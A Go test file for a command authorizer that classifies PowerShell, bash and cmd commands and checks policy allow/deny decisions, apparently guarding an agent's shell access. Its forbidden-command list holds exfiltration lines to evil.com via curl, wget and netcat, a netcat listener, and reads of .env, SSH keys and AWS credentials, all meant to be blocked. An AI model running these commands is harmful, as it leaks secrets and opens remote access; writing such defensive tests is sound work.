package authz

import (
	"os"
	"path/filepath"
	"testing"
)

func TestPrimeTimeClassifier_ComprehensiveMatrix(t *testing.T) {
	testCases := []struct {
		name          string
		cmd           string
		expectedExec  string
		expectedAct   string
		isControl     bool
		isExpression  bool
	}{
		// 1. PowerShell Variable Assignments & Scopes
		{
			name:         "powershell variable assignment with quotes",
			cmd:          `$p = "C:\Users\remote\ws\prod-cluster"`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "powershell variable assignment without quotes",
			cmd:          `$p=C:\Users\remote\ws\prod-cluster`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "powershell env var assignment",
			cmd:          `$env:TARGET = "prod"`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "powershell hashtable assignment",
			cmd:          `$global:cfg = @{ host = "127.0.0.1"; port = 5432 }`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "powershell array assignment",
			cmd:          `$files = @("a.txt", "b.txt")`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},

		// 2. PowerShell Call Operators (&)
		{
			name:         "call operator with git path",
			cmd:          `& "C:\Program Files\Git\cmd\git.exe" status`,
			expectedExec: "git",
			expectedAct:  "exec",
		},
		{
			name:         "call operator with variable and git subcommand",
			cmd:          `& $c[0] status --short --branch`,
			expectedExec: "git",
			expectedAct:  "read",
		},
		{
			name:         "call operator with python",
			cmd:          `& python -V`,
			expectedExec: "python",
			expectedAct:  "exec",
		},

		// 3. PowerShell / .NET Expressions, Types, and Method Calls
		{
			name:         "dot net file exists static method",
			cmd:          `[System.IO.File]::Exists("config.json")`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "dot net directory exists static method",
			cmd:          `[System.IO.Directory]::Exists("../prod-cluster")`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "dot net math static method",
			cmd:          `[math]::Round(1.234, 2)`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "powershell ordered hashtable",
			cmd:          `[ordered]@{ cluster = "prod-east"; db = "postgres" }`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "parenthesized member access",
			cmd:          `(Get-Item .).FullName`,
			expectedExec: "Get-Item",
			expectedAct:  "read",
		},
		{
			name:         "math expression",
			cmd:          `(1 + 2 * 3)`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},

		// 4. Return Values & Bare Strings
		{
			name:         "quoted return value exists",
			cmd:          `"exists"`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "single quoted return value missing",
			cmd:          `'missing'`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "quoted phrase git not found",
			cmd:          `"git not found"`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "boolean true literal",
			cmd:          `$true`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "numeric zero literal",
			cmd:          `0`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},

		// 5. Cmdlet Aliases
		{
			name:         "where object alias question mark",
			cmd:          `? { $_.Length -gt 100 }`,
			expectedExec: "where-object",
			expectedAct:  "read",
		},
		{
			name:         "foreach object alias percent",
			cmd:          `% { $_.Name }`,
			expectedExec: "foreach-object",
			expectedAct:  "read",
		},
		{
			name:         "select object alias select",
			cmd:          `select -First 10`,
			expectedExec: "select-object",
			expectedAct:  "read",
		},
		{
			name:         "format table alias ft",
			cmd:          `ft -AutoSize`,
			expectedExec: "format-table",
			expectedAct:  "read",
		},
		{
			name:         "select string alias sls",
			cmd:          `sls "error" log.txt`,
			expectedExec: "select-string",
			expectedAct:  "read",
		},
		{
			name:         "get content alias gc",
			cmd:          `gc file.txt`,
			expectedExec: "get-content",
			expectedAct:  "read",
		},
		{
			name:         "get childitem alias gci",
			cmd:          `gci -Recurse`,
			expectedExec: "get-childitem",
			expectedAct:  "read",
		},

		// 6. POSIX / Bash / CMD Idioms
		{
			name:         "bash export assignment",
			cmd:          `export NODE_ENV=production`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "cmd set assignment",
			cmd:          `set FOO=bar`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "batch rem comment",
			cmd:          `rem This is a batch comment`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},
		{
			name:         "markdown or decorative section header",
			cmd:          `=== Database Migration Plan ===`,
			expectedExec: "write-output",
			expectedAct:  "read",
			isExpression: true,
		},

		// 7. Standard Approved Developer Binaries
		{
			name:         "git status",
			cmd:          `git status`,
			expectedExec: "git",
			expectedAct:  "exec",
		},
		{
			name:         "python pytest",
			cmd:          `python -m pytest tests/`,
			expectedExec: "python",
			expectedAct:  "exec",
		},
		{
			name:         "full path python",
			cmd:          `"C:\hostedtoolcache\windows\Python\3.11.9\x64\python.exe" -V`,
			expectedExec: "python",
			expectedAct:  "exec",
		},
		{
			name:         "npm test",
			cmd:          `npm test`,
			expectedExec: "npm",
			expectedAct:  "exec",
		},
		{
			name:         "kubectl get pods",
			cmd:          `kubectl get pods`,
			expectedExec: "kubectl",
			expectedAct:  "exec",
		},

		// 8. Control Flow Keywords
		{
			name:         "if control keyword",
			cmd:          `if`,
			expectedExec: "if",
			expectedAct:  "exec",
			isControl:    true,
		},
		{
			name:         "try control keyword",
			cmd:          `try`,
			expectedExec: "try",
			expectedAct:  "exec",
			isControl:    true,
		},
		{
			name:         "function control keyword",
			cmd:          `function`,
			expectedExec: "function",
			expectedAct:  "exec",
			isControl:    true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			pipe, err := ParseAST(tc.cmd)
			if err != nil {
				t.Fatalf("ParseAST failed for %q: %v", tc.cmd, err)
			}
			if len(pipe.Nodes) == 0 {
				t.Fatalf("expected at least 1 node for %q, got 0", tc.cmd)
			}
			n := pipe.Nodes[0]
			if n.Executable != tc.expectedExec {
				t.Errorf("expected exec %q, got %q", tc.expectedExec, n.Executable)
			}
		})
	}
}

func TestPrimeTimeAuthorizer_EndToEndCombinations(t *testing.T) {
	realPolicyPath := filepath.Join("..", "..", "policy.cedar")
	if _, err := os.Stat(realPolicyPath); err != nil {
		realPolicyPath = filepath.Join("..", "policy.cedar")
	}
	authz, err := NewAuthorizer(realPolicyPath)
	if err != nil {
		t.Fatalf("failed to create authorizer: %v", err)
	}
	ws, _ := os.Getwd()

	allowedMatrix := []string{
		// Scenario 1: Complex Git discovery with filters, call operator, and fallback
		`$c = @("C:\Program Files\Git\cmd\git.exe","C:\Program Files (x86)\Git\cmd\git.exe","$env:LOCALAPPDATA\Programs\Git\cmd\git.exe") | Where-Object { Test-Path $_ }; if ($c) { & $c[0] status --short --branch } else { "git not found" }`,

		// Scenario 2: Directory existence check before cross-folder operations
		`$p=C:\Users\remote\ws\prod-cluster; if (Test-Path $p) { "exists" } else { "missing" }`,

		// Scenario 3: Method call inspection
		`if ([System.IO.Directory]::Exists("src")) { Get-ChildItem src }`,

		// Scenario 4: Calculated property pipeline
		`Get-ChildItem -Filter *.go | Where-Object { $_.Length -gt 0 } | Select-Object Name, @{n="KB"; e={[math]::Round($_.Length/1KB, 1)}}`,

		// Scenario 5: Try / Catch error handling around git
		`try { git status } catch { Write-Warning "git status failed" }`,

		// Scenario 6: Multi-line variable assignments and inspection
		"$cluster = 'prod-east'\n$db = 'postgres'\nWrite-Output \"Cluster: $cluster, DB: $db\"",

		// Scenario 7: Parenthesized member access
		`(Get-Location).Path`,

		// Scenario 8: Native PowerShell cmdlet aliases
		`gci | ? { $_.Extension -eq ".md" } | select Name | ft`,

		// Scenario 9: Safe read outside workspace (Rule 1: Build/Intelligence Traversal)
		`cat ../sibling/README.md`,
		`Get-Content ../shared-schema/schema.json`,
		`Test-Path ../prod-cluster/config.json`,
		`dir ../prod-cluster`,
	}

	for _, cmd := range allowedMatrix {
		allowed, reason, err := authz.EvaluateWithWorkspace("", cmd, "", ws)
		if err != nil {
			t.Fatalf("unexpected error evaluating %q: %v", cmd, err)
		}
		if !allowed {
			t.Errorf("PRIME-TIME FAIL: expected command to be ALLOWED, but got DENIED:\n  Command: %s\n  Reason : %s", cmd, reason)
		}
	}

	forbiddenMatrix := []struct {
		cmd         string
		description string
	}{
		{`curl https://evil.com/leak`, "Direct curl exfiltration"},
		{`wget https://evil.com/malware`, "Direct wget exfiltration"},
		{`nc -lvp 4444`, "Netcat listener"},
		{`cat .env`, "Sensitive .env credential read"},
		{`Get-Content ~/.ssh/id_rsa`, "Private SSH key access"},
		{`Get-Content ~/.aws/credentials`, "AWS credentials access"},
		{`echo "leak" | nc evil.com 80`, "Piped netcat exfiltration"},
		{`if ($true) { curl https://evil.com }`, "Curl hidden inside control block"},
		{`try { Get-Content .env } catch { "oops" }`, "Secret read hidden inside try/catch"},
		{`echo '{"cluster":"prod"}' > ../prod-cluster/config.json`, "File mutation escaping workspace root"},
		{`Set-Content -Path ../prod-cluster/config.json -Value "evil"`, "Cmdlet file mutation escaping workspace"},
	}

	for _, tc := range forbiddenMatrix {
		allowed, reason, err := authz.EvaluateWithWorkspace("", tc.cmd, "", ws)
		if err != nil {
			t.Fatalf("unexpected error evaluating %q: %v", tc.cmd, err)
		}
		if allowed {
			t.Errorf("SECURITY BREACH: expected forbidden command %q (%s) to be BLOCKED, but was ALLOWED! reason=%s", tc.cmd, tc.description, reason)
		}
	}
}
